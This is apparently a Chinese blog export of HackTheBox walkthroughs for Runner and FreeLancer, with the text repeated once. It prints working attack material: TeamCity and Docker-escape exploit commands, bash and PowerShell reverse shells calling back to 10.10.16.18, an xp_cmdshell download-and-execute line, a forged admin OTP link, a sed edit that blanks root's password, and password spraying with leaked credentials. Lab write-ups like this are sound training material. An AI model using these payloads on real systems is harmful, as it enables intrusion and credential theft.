执行没找到啥，但是能搜到一个 `id_rsa`。\n\n```bash\nfind / -name id_rsa 2> /dev/null\n```\n\n这里 `2> /dev/null` 是把 stderr 重定向到 `/dev/null`，不然会有很多权限不足的提示。\n在网站中的 User 里有个 john，然后就可以用这个 `id_rsa` 登录 john 了。\n\n```bash\nchmod 600 id_rsa\nssh john@runner.htb -i id_rsa\n```\n\n一开始报 `Load key \"id_rsa\": error in libcrypto`，原来是末尾少打一个换行。\n再传 `linpeas.sh` 扫一轮，发现 `/etc/hosts` 里还有个域名叫 `portainer-administration.runner.htb`，加到本机里，然后访问，发现是个 Portainer，查漏洞，没有。\n\n之前的网站是有个备份的，下载下来能找到 `users`，内容如下：\n\n```csv\nID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM\n1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717486715003, BCRYPT\n2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT\n11, city_adminopx8, $2a$07$K1PwHspWALRGHbsy0XaPOe7cIK2IVF5hkq8DS/t0L6ulKDCNoACY2, , angry-admin@funnybunny.org, 1717487324779, BCRYPT\n```\n\n用 john 把 matthew 的密码爆出来，为 `piper123`，注意 john 会把结果存在 `~/.john/john.pot` 里，再跑的话要 `john --show hash.txt` 才能显示。\n\n用这个去登录 Portainer，然后用 CVE-2024-21626 打 docker 逃逸，启动一个 container，把 working dir 挂到 `/proc/self/fd/8`，网页 shell 不好使，用 bash 弹个 shell 回来：\n\n```bash\nbash -i >& /dev/tcp/10.10.16.18/55555 0>&1\n```\n\n然后 `cat ../../../root/root.txt` 就拿到第二个 flag 了。\n无聊的时候想用 john 爆 `/etc/shadow` 里 root 的密码，发现还得加 `--format=crypt`。\n\n### 后继小研究\n\n发现 docker 里面没有 nano 也没有 vim，但是有 sed，执行如下命令：\n\n```bash\nsed -i 's/root:x:/root::/' ../../../etc/passwd\n```\n\n然后就可以 `su root` 了，执行 `crontab -e`，发现有个定时任务。\n\n```bash\n@reboot docker start kind_leavitt\n@reboot /root/monitor.sh\n*/5 * * * * /root/monitor.sh\n*/2 * * * * /root/docker_clean.sh\n```\n\n### 浅谈 Docker 涉及的一些概念\n\n**cgroup**（Control Groups）是 Linux 内核提供的一种机制，用于限制、记录和隔离进程组（如容器）的资源使用情况（如 CPU、内存、磁盘 I/O、网络带宽等）。cgroup 可以帮助系统管理员分配系统资源，以确保每个容器或进程组都能获得足够的资源，并防止单个容器或进程组消耗过多资源而影响其他容器或进程组的正常运行。\n**runC** 是一个符合 Open Container Initiative (OCI) 规范的容器运行时。它是一个轻量级的运行时，负责创建和运行容器。runC 可以被认为是 Docker 的默认底层运行时之一。runC 提供了对容器的直接管理接口，Docker 利用 runC 来实际执行容器操作。\n**containerd** 是一个高层次的容器运行时，由 Docker Inc. 维护。containerd 提供了容器生命周期管理的高级 API，支持创建、管理和运行容器。它内部可以调用 runC 或其他 OCI 兼容的运行时来实际执行容器操作。containerd 是 Docker 的核心组件之一，负责管理容器运行时的交互。\n**CRI-O** 是 Kubernetes 的一个容器运行时接口（CRI）实现，专门为 Kubernetes 设计。它直接运行 OCI 容器，使用 runC 或 Kata Containers 作为底层运行时。CRI-O 提供了一个轻量级的运行时环境，专注于 Kubernetes 的需求。\n> 总结：Docker 使用 containerd 作为其核心运行时，containerd 内部则调用 runC 或其他运行时来实际管理容器，所有的容器运行时都依赖 cgroup 来实现资源隔离和管理。\n\n## FreeLancer\n\nfscan 开扫，疑惑了很久怎么打，原来是环境问题，80 端口我没扫到，现在应该修好了。\n\n```bash\n$ fscan -h 10.10.11.5 -p 1-65535\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.4\nstart infoscan\n10.10.11.5:88 open\n10.10.11.5:139 open\n10.10.11.5:135 open\n10.10.11.5:53 open\n10.10.11.5:593 open\n10.10.11.5:80 open\n10.10.11.5:464 open\n10.10.11.5:389 open\n10.10.11.5:445 open\n10.10.11.5:636 open\n10.10.11.5:3269 open\n10.10.11.5:3268 open\n10.10.11.5:5985 open\n10.10.11.5:9389 open\n10.10.11.5:47001 open\n10.10.11.5:49667 open\n10.10.11.5:49669 open\n10.10.11.5:49665 open\n10.10.11.5:49671 open\n10.10.11.5:49670 open\n10.10.11.5:49664 open\n10.10.11.5:49675 open\n10.10.11.5:49672 open\n10.10.11.5:49666 open\n10.10.11.5:49815 open\n10.10.11.5:55297 open\n[*] alive ports len is: 26\nstart vulscan\n[*] WebTitle http://10.10.11.5         code:302 len:0      title:None 跳转url: http://freelancer.htb/\n[*] NetInfo\n[*]10.10.11.5\n   [->]DC\n   [->]10.10.11.5\n[*] WebTitle http://10.10.11.5:5985    code:404 len:315    title:Not Found\n[*] WebTitle http://10.10.11.5:47001   code:404 len:315    title:Not Found\n[*] WebTitle http://freelancer.htb/    code:200 len:57293  title:Freelancer - Job Board & Hiring platform\n已完成 26/26\n[*] 扫描结束,耗时: 1m15.097074037s\n```\n\n老样子加进 hosts，访问，是个招聘网站，用 dirsearch 一顿扫，结果里面一堆 `/admin` 路由的。\n注册了一个 employer 的帐号，密码还不能太简单，登录说没激活，点击忘记密码，重置一次，就能登录了。\n有个二维码登录的功能，说用手机扫就能直接登录，随便找个[在线识别网站](https://zxing.org/w/decode.jspx)识别出 `http://freelancer.htb/accounts/login/otp/MTAwMTA=/700a374a3c075b4da499d76a39953af6/`\n\n`MTAwMTA=` base64 解出是 `10010`，猜测是用户的 ID，后面应该是关于时间的凭据。在 Blog 里随便发表一条评论，然后自己的链接就是 `http://freelancer.htb/accounts/profile/visit/10010/` ，那么就八九不离十了，从 1 开始试，发现 `http://freelancer.htb/accounts/profile/visit/2/` 可以访问到，而且 username 是 admin，那么尝试伪造 admin 登录，2 对应 base64 即为 `Mg==`，拼接链接 `http://freelancer.htb/accounts/login/otp/Mg==/700a374a3c075b4da499d76a39953af6/` 成功登录 admin。\n\n登上之后页面和之前差不多，直接进 `/admin` 路由，到了管理页面。一眼看到 SQL Terminal，GPT 说可以用 xp_cmdshell 执行命令，发现没权限\n\n执行如下命令：\n\n```sql\nSELECT name AS DatabaseName, suser_sname(owner_sid) AS Owner\nFROM sys.databases;\n```\n\n可以看到 Owner 全部是 sa，然后模拟 sa 登录，执行如下命令启用 xp_cmdshell：\n\n```sql\nEXECUTE AS LOGIN = 'sa'\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n```\n\n再\n\n```sql\nEXEC xp_cmdshell 'dir'\n```\n\n发现命令执行成功。\n想弹个 shell，搞着搞着发现 bash 不了，才想起来这是 Windows\n\n```sql\nEXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.16.18/1.ps1)'\n```\n\n发现弹了一下就断了，应该是被杀软掐了。\n试了很多个都不行，没办法了，用大哥找到的：\n\n```shell\ndo {\n    # Delay before establishing network connection, and between retries\n    Start-Sleep -Seconds 1\n\n    # Connect to C2\n    try{\n        $TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.18',55555)\n    } catch {}\n} until ($TCPClient.Connected)\n\n$NetworkStream = $TCPClient.GetStream()\n$StreamWriter = New-Object IO.StreamWriter($NetworkStream)\n\n# Writes a string to C2\nfunction WriteToStream ($String) {\n    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)\n    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}\n\n    # Write to C2\n    $StreamWriter.Write($String + 'SHELL> ')\n    $StreamWriter.Flush()\n}\n\n# Initial output to C2. The function also creates the inital empty byte array buffer used below.\nWriteToStream ''\n\n# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.\nwhile(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {\n    # Encode command, remove last byte/newline\n    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)\n    \n    # Execute command and save output (including errors thrown)\n    $Output = try {\n            Invoke-Expression $Command 2>&1 | Out-String\n        } catch {\n            $_ | Out-String\n        }\n\n    # Write output to C2\n    WriteToStream ($Output)\n}\n# Closes the StreamWriter and the underlying TCPClient\n$StreamWriter.Close()\n```\n\n看到用户文件夹下的 `Download` 有个 `SQLEXPR-2019_x64_ENU` 目录，进去发现 `sql-Configuration.INI`，内容如下：\n\n```ini\n[OPTIONS]\nACTION=\"Install\"\nQUIET=\"True\"\nFEATURES=SQL\nINSTANCENAME=\"SQLEXPRESS\"\nINSTANCEID=\"SQLEXPRESS\"\nRSSVCACCOUNT=\"NT Service\\ReportServer$SQLEXPRESS\"\nAGTSVCACCOUNT=\"NT AUTHORITY\\NETWORK SERVICE\"\nAGTSVCSTARTUPTYPE=\"Manual\"\nCOMMFABRICPORT=\"0\"\nCOMMFABRICNETWORKLEVEL=\"\"0\"\nCOMMFABRICENCRYPTION=\"0\"\nMATRIXCMBRICKCOMMPORT=\"0\"\nSQLSVCSTARTUPTYPE=\"Automatic\"\nFILESTREAMLEVEL=\"0\"\nENABLERANU=\"False\"\nSQLCOLLATION=\"SQL_Latin1_General_CP1_CI_AS\"\nSQLSVCACCOUNT=\"FREELANCER\\sql_svc\"\nSQLSVCPASSWORD=\"IL0v3ErenY3ager\"\nSQLSYSADMINACCOUNTS=\"FREELANCER\\Administrator\"\nSECURITYMODE=\"SQL\"\nSAPWD=\"t3mp0r@ryS@PWD\"\nADDCURRENTUSERASSQLADMIN=\"False\"\nTCPENABLED=\"1\"\nNPENABLED=\"1\"\nBROWSERSVCSTARTUPTYPE=\"Automatic\"\nIAcceptSQLServerLicenseTerms=True\n```\n\n用这两个密码和 Users 文件夹下的用户开爆\n\n```bash\n$ craccrackmapexec smb 10.10.11.5 -u user.txt -p passwd.txt\nSMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\Administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE\n\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE ILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\mikasaAckerman:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [+] freelancer.htb\\mikasaAckerman:IL0v3ErenY3ager\n```\n\n爆出来 mikasaAckerman/IL0v3ErenY3ager，然后传 [RunasCs](https://github.com/antonioCoco/RunasCs) 横向移动，执行\n\n```shell\n./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.18:55556\n```\n\n把 mikasaAckerman 的 shell 弹出来，在 Desktop 下找到第一个 flag。\n这里不知道为啥用 evil-winrm 连不上，可能是因为权限问题。\n\nsystem flag 涉及域渗透，一点不会。\n桌面还有个 `mail.txt`，内容如下：\n\n```plain\nHello Mikasa,\nI tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the \"DATACENTER-2019\" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.\nI attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.\nNevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.\nBest regards,\n```\n\n翻译一下就是\n\n```plain\n你好，米卡萨，\n\n我再次尝试与丽莎·卡扎诺夫合作，寻求她的帮助以解决“DATACENTER-2019”电脑上的蓝屏死机（BSOD）问题。正如你所知，这个问题在我们安装了 SQL Server 2019 的新更新后开始出现。\n\n我尝试了你在上封邮件中提供的解决方案，但不幸的是，没有任何改进。每当我们尝试与安装的实例建立远程 SQL 连接时，服务器的 CPU 就会开始过热，RAM 使用量不断增加，直到出现蓝屏死机，迫使服务器重启。\n\n然而，丽莎要求我在数据中心生成一个完整的内存转储，并将其发送给你以便进一步协助解决问题。\n\n此致\n\n最佳问候\n```\n\n意思就是他把内存 dump 下来了，看样子应该就是 `Desktop` 下的 `MEMORY.7z`，如何把这个文件传出来费了很大劲。\n\n## Blurry\n\nfscan 开扫\n\n```bash\nstart infoscan\n10.10.11.19:80 open\n10.10.11.19:22 open\n[*] alive ports len is: 2\nstart vulscan\n[*] WebTitle http://10.10.11.19        code:301 len:169    title:301 Moved Permanently 跳转url: http://app.blurry.htb/\n```\n\n## 参考\n\nRunner\n<https://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632>\n<https://blog.csdn.net/m0_52742680/article/details/138076335>\n<https://nitroc.org/posts/cve-2024-21626-illustrated/>\n\nFreeLancer\n<https://blog.csdn.net/m0_52742680/article/details/139441094>\n","source":"_posts/HackTheBox 笔记 - 2.md","raw":"---\ntitle: HackTheBox 笔记 - 2\ndate: 2024-06-04 13:52:00\ntags: [Web, 渗透]\ncategories: 渗透\n---\n\n不得不找饭吃了。\nTwo Million / Mailing / BoardLight / Usage\n\n<!--more-->\n\n## Runner\n\n扫端口，有 22，80，8000，访问 80 发现是个静态网页，dirsearch 也没扫出东西，再扫 8000，只有个 `/health` 和 `/version` 路由，也没什么用。\n再扫子域名，也没扫出来东西，一看 wp 原来人家用的超大字典，晕\n\n```bash\nwfuzwfuzz -c -w  /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u \"http://runner.htb\" -H \"Host:FUZZ.runner.htb\" --hw 10\n```\n\n于是就扫出来 `teamcity.runner.htb`，访问，是个 TeamCity。搜一下 CVE：\n\n```bash\n$ searchsploit teamcity\n------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                   |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nJetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                              | java/remote/47891.txt\nJetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                       | java/remote/51884.py\nTeamCity < 9.0.2 - Disabled Registration Bypass                                                                                                  | multiple/remote/46514.js\nTeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                          | multiple/remote/45917.rb\nTeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                              | php/webapps/48201.py\n------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n\n网页写着 `Version 2023.05.3 (build 129390)`，这不正好是 CVE-2023-42793，直接 `searchsploit -p java/remote/51884.py` 找到 PoC 的位置，然后复制过来跑\n\n```bash\n$ python 51884.py -u http://teamcity.runner.htb\n\n=====================================================\n*       CVE-2023-42793                              *\n*  TeamCity Admin Account Creation                  *\n*                                                   *\n*  Author: ByteHunter                               *\n=====================================================\n\nToken: eyJ0eXAiOiAiVENWMiJ9.SXpoSWFONE1EaGJ3SmowbGxLMmNfSmlaZkZV.NzU0ZDU4NzYtNzU3My00ZTgwLWFmNWMtMGIyNjliZjY0ZDkw\nSuccessfully exploited!\nURL: http://teamcity.runner.htb\nUsername: city_adminOpx8\nPassword: Main_password!!**\n```\n\n把 Token 存到文件 `token`，然后执行这个 [PoC](https://github.com/Zyad-Elsayed/CVE-2023-42793/blob/main/rce.py)\n\n```bash\npython rce.py -u http://teamcity.runner.htb -t token -c '\"/bin/bash\"&params=\"-c\"&params=\"sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.18%2F55555%200%3E%261\"'\n```\n\n然后就拿到 shell 了，得到第一个 flag。注意这里是 docker 的 shell，执行 `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` 换个 shell（不知道和直接 `bash` 有啥区别），传 `linpeas.sh` 执行没找到啥，但是能搜到一个 `id_rsa`。\n\n```bash\nfind / -name id_rsa 2> /dev/null\n```\n\n这里 `2> /dev/null` 是把 stderr 重定向到 `/dev/null`，不然会有很多权限不足的提示。\n在网站中的 User 里有个 john，然后就可以用这个 `id_rsa` 登录 john 了。\n\n```bash\nchmod 600 id_rsa\nssh john@runner.htb -i id_rsa\n```\n\n一开始报 `Load key \"id_rsa\": error in libcrypto`，原来是末尾少打一个换行。\n再传 `linpeas.sh` 扫一轮，发现 `/etc/hosts` 里还有个域名叫 `portainer-administration.runner.htb`，加到本机里，然后访问，发现是个 Portainer，查漏洞，没有。\n\n之前的网站是有个备份的，下载下来能找到 `users`，内容如下：\n\n```csv\nID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM\n1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717486715003, BCRYPT\n2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT\n11, city_adminopx8, $2a$07$K1PwHspWALRGHbsy0XaPOe7cIK2IVF5hkq8DS/t0L6ulKDCNoACY2, , angry-admin@funnybunny.org, 1717487324779, BCRYPT\n```\n\n用 john 把 matthew 的密码爆出来，为 `piper123`，注意 john 会把结果存在 `~/.john/john.pot` 里，再跑的话要 `john --show hash.txt` 才能显示。\n\n用这个去登录 Portainer，然后用 CVE-2024-21626 打 docker 逃逸，启动一个 container，把 working dir 挂到 `/proc/self/fd/8`，网页 shell 不好使，用 bash 弹个 shell 回来：\n\n```bash\nbash -i >& /dev/tcp/10.10.16.18/55555 0>&1\n```\n\n然后 `cat ../../../root/root.txt` 就拿到第二个 flag 了。\n无聊的时候想用 john 爆 `/etc/shadow` 里 root 的密码，发现还得加 `--format=crypt`。\n\n### 后继小研究\n\n发现 docker 里面没有 nano 也没有 vim，但是有 sed，执行如下命令：\n\n```bash\nsed -i 's/root:x:/root::/' ../../../etc/passwd\n```\n\n然后就可以 `su root` 了，执行 `crontab -e`，发现有个定时任务。\n\n```bash\n@reboot docker start kind_leavitt\n@reboot /root/monitor.sh\n*/5 * * * * /root/monitor.sh\n*/2 * * * * /root/docker_clean.sh\n```\n\n### 浅谈 Docker 涉及的一些概念\n\n**cgroup**（Control Groups）是 Linux 内核提供的一种机制，用于限制、记录和隔离进程组（如容器）的资源使用情况（如 CPU、内存、磁盘 I/O、网络带宽等）。cgroup 可以帮助系统管理员分配系统资源，以确保每个容器或进程组都能获得足够的资源，并防止单个容器或进程组消耗过多资源而影响其他容器或进程组的正常运行。\n**runC** 是一个符合 Open Container Initiative (OCI) 规范的容器运行时。它是一个轻量级的运行时，负责创建和运行容器。runC 可以被认为是 Docker 的默认底层运行时之一。runC 提供了对容器的直接管理接口，Docker 利用 runC 来实际执行容器操作。\n**containerd** 是一个高层次的容器运行时，由 Docker Inc. 维护。containerd 提供了容器生命周期管理的高级 API，支持创建、管理和运行容器。它内部可以调用 runC 或其他 OCI 兼容的运行时来实际执行容器操作。containerd 是 Docker 的核心组件之一，负责管理容器运行时的交互。\n**CRI-O** 是 Kubernetes 的一个容器运行时接口（CRI）实现，专门为 Kubernetes 设计。它直接运行 OCI 容器，使用 runC 或 Kata Containers 作为底层运行时。CRI-O 提供了一个轻量级的运行时环境，专注于 Kubernetes 的需求。\n> 总结：Docker 使用 containerd 作为其核心运行时，containerd 内部则调用 runC 或其他运行时来实际管理容器，所有的容器运行时都依赖 cgroup 来实现资源隔离和管理。\n\n## FreeLancer\n\nfscan 开扫，疑惑了很久怎么打，原来是环境问题，80 端口我没扫到，现在应该修好了。\n\n```bash\n$ fscan -h 10.10.11.5 -p 1-65535\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.4\nstart infoscan\n10.10.11.5:88 open\n10.10.11.5:139 open\n10.10.11.5:135 open\n10.10.11.5:53 open\n10.10.11.5:593 open\n10.10.11.5:80 open\n10.10.11.5:464 open\n10.10.11.5:389 open\n10.10.11.5:445 open\n10.10.11.5:636 open\n10.10.11.5:3269 open\n10.10.11.5:3268 open\n10.10.11.5:5985 open\n10.10.11.5:9389 open\n10.10.11.5:47001 open\n10.10.11.5:49667 open\n10.10.11.5:49669 open\n10.10.11.5:49665 open\n10.10.11.5:49671 open\n10.10.11.5:49670 open\n10.10.11.5:49664 open\n10.10.11.5:49675 open\n10.10.11.5:49672 open\n10.10.11.5:49666 open\n10.10.11.5:49815 open\n10.10.11.5:55297 open\n[*] alive ports len is: 26\nstart vulscan\n[*] WebTitle http://10.10.11.5         code:302 len:0      title:None 跳转url: http://freelancer.htb/\n[*] NetInfo\n[*]10.10.11.5\n   [->]DC\n   [->]10.10.11.5\n[*] WebTitle http://10.10.11.5:5985    code:404 len:315    title:Not Found\n[*] WebTitle http://10.10.11.5:47001   code:404 len:315    title:Not Found\n[*] WebTitle http://freelancer.htb/    code:200 len:57293  title:Freelancer - Job Board & Hiring platform\n已完成 26/26\n[*] 扫描结束,耗时: 1m15.097074037s\n```\n\n老样子加进 hosts，访问，是个招聘网站，用 dirsearch 一顿扫，结果里面一堆 `/admin` 路由的。\n注册了一个 employer 的帐号，密码还不能太简单，登录说没激活，点击忘记密码，重置一次，就能登录了。\n有个二维码登录的功能，说用手机扫就能直接登录，随便找个[在线识别网站](https://zxing.org/w/decode.jspx)识别出 `http://freelancer.htb/accounts/login/otp/MTAwMTA=/700a374a3c075b4da499d76a39953af6/`\n\n`MTAwMTA=` base64 解出是 `10010`，猜测是用户的 ID，后面应该是关于时间的凭据。在 Blog 里随便发表一条评论，然后自己的链接就是 `http://freelancer.htb/accounts/profile/visit/10010/` ，那么就八九不离十了，从 1 开始试，发现 `http://freelancer.htb/accounts/profile/visit/2/` 可以访问到，而且 username 是 admin，那么尝试伪造 admin 登录，2 对应 base64 即为 `Mg==`，拼接链接 `http://freelancer.htb/accounts/login/otp/Mg==/700a374a3c075b4da499d76a39953af6/` 成功登录 admin。\n\n登上之后页面和之前差不多，直接进 `/admin` 路由，到了管理页面。一眼看到 SQL Terminal，GPT 说可以用 xp_cmdshell 执行命令，发现没权限\n\n执行如下命令：\n\n```sql\nSELECT name AS DatabaseName, suser_sname(owner_sid) AS Owner\nFROM sys.databases;\n```\n\n可以看到 Owner 全部是 sa，然后模拟 sa 登录，执行如下命令启用 xp_cmdshell：\n\n```sql\nEXECUTE AS LOGIN = 'sa'\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n```\n\n再\n\n```sql\nEXEC xp_cmdshell 'dir'\n```\n\n发现命令执行成功。\n想弹个 shell，搞着搞着发现 bash 不了，才想起来这是 Windows\n\n```sql\nEXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.16.18/1.ps1)'\n```\n\n发现弹了一下就断了，应该是被杀软掐了。\n试了很多个都不行，没办法了，用大哥找到的：\n\n```shell\ndo {\n    # Delay before establishing network connection, and between retries\n    Start-Sleep -Seconds 1\n\n    # Connect to C2\n    try{\n        $TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.18',55555)\n    } catch {}\n} until ($TCPClient.Connected)\n\n$NetworkStream = $TCPClient.GetStream()\n$StreamWriter = New-Object IO.StreamWriter($NetworkStream)\n\n# Writes a string to C2\nfunction WriteToStream ($String) {\n    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)\n    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}\n\n    # Write to C2\n    $StreamWriter.Write($String + 'SHELL> ')\n    $StreamWriter.Flush()\n}\n\n# Initial output to C2. The function also creates the inital empty byte array buffer used below.\nWriteToStream ''\n\n# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.\nwhile(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {\n    # Encode command, remove last byte/newline\n    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)\n    \n    # Execute command and save output (including errors thrown)\n    $Output = try {\n            Invoke-Expression $Command 2>&1 | Out-String\n        } catch {\n            $_ | Out-String\n        }\n\n    # Write output to C2\n    WriteToStream ($Output)\n}\n# Closes the StreamWriter and the underlying TCPClient\n$StreamWriter.Close()\n```\n\n看到用户文件夹下的 `Download` 有个 `SQLEXPR-2019_x64_ENU` 目录，进去发现 `sql-Configuration.INI`，内容如下：\n\n```ini\n[OPTIONS]\nACTION=\"Install\"\nQUIET=\"True\"\nFEATURES=SQL\nINSTANCENAME=\"SQLEXPRESS\"\nINSTANCEID=\"SQLEXPRESS\"\nRSSVCACCOUNT=\"NT Service\\ReportServer$SQLEXPRESS\"\nAGTSVCACCOUNT=\"NT AUTHORITY\\NETWORK SERVICE\"\nAGTSVCSTARTUPTYPE=\"Manual\"\nCOMMFABRICPORT=\"0\"\nCOMMFABRICNETWORKLEVEL=\"\"0\"\nCOMMFABRICENCRYPTION=\"0\"\nMATRIXCMBRICKCOMMPORT=\"0\"\nSQLSVCSTARTUPTYPE=\"Automatic\"\nFILESTREAMLEVEL=\"0\"\nENABLERANU=\"False\"\nSQLCOLLATION=\"SQL_Latin1_General_CP1_CI_AS\"\nSQLSVCACCOUNT=\"FREELANCER\\sql_svc\"\nSQLSVCPASSWORD=\"IL0v3ErenY3ager\"\nSQLSYSADMINACCOUNTS=\"FREELANCER\\Administrator\"\nSECURITYMODE=\"SQL\"\nSAPWD=\"t3mp0r@ryS@PWD\"\nADDCURRENTUSERASSQLADMIN=\"False\"\nTCPENABLED=\"1\"\nNPENABLED=\"1\"\nBROWSERSVCSTARTUPTYPE=\"Automatic\"\nIAcceptSQLServerLicenseTerms=True\n```\n\n用这两个密码和 Users 文件夹下的用户开爆\n\n```bash\n$ craccrackmapexec smb 10.10.11.5 -u user.txt -p passwd.txt\nSMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\Administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE\n\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE ILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [-] freelancer.htb\\mikasaAckerman:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE\nSMB         10.10.11.5      445    DC               [+] freelancer.htb\\mikasaAckerman:IL0v3ErenY3ager\n```\n\n爆出来 mikasaAckerman/IL0v3ErenY3ager，然后传 [RunasCs](https://github.com/antonioCoco/RunasCs) 横向移动，执行\n\n```shell\n./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.18:55556\n```\n\n把 mikasaAckerman 的 shell 弹出来，在 Desktop 下找到第一个 flag。\n这里不知道为啥用 evil-winrm 连不上，可能是因为权限问题。\n\nsystem flag 涉及域渗透，一点不会。\n桌面还有个 `mail.txt`，内容如下：\n\n```plain\nHello Mikasa,\nI tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the \"DATACENTER-2019\" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.\nI attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.\nNevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.\nBest regards,\n```\n\n翻译一下就是\n\n```plain\n你好，米卡萨，\n\n我再次尝试与丽莎·卡扎诺夫合作，寻求她的帮助以解决“DATACENTER-2019”电脑上的蓝屏死机（BSOD）问题。正如你所知，这个问题在我们安装了 SQL Server 2019 的新更新后开始出现。\n\n我尝试了你在上封邮件中提供的解决方案，但不幸的是，没有任何改进。每当我们尝试与安装的实例建立远程 SQL 连接时，服务器的 CPU 就会开始过热，RAM 使用量不断增加，直到出现蓝屏死机，迫使服务器重启。\n\n然而，丽莎要求我在数据中心生成一个完整的内存转储，并将其发送给你以便进一步协助解决问题。\n\n此致\n\n最佳问候\n```\n\n意思就是他把内存 dump 下来了，看样子应该就是 `Desktop` 下的 `MEMORY.7z`，如何把这个文件传出来费了很大劲。\n\n## Blurry\n\nfscan 开扫\n\n```bash\nstart infoscan\n10.10.11.19:80 open\n10.10.11.19:22 open\n[*] alive ports len is: 2\nstart 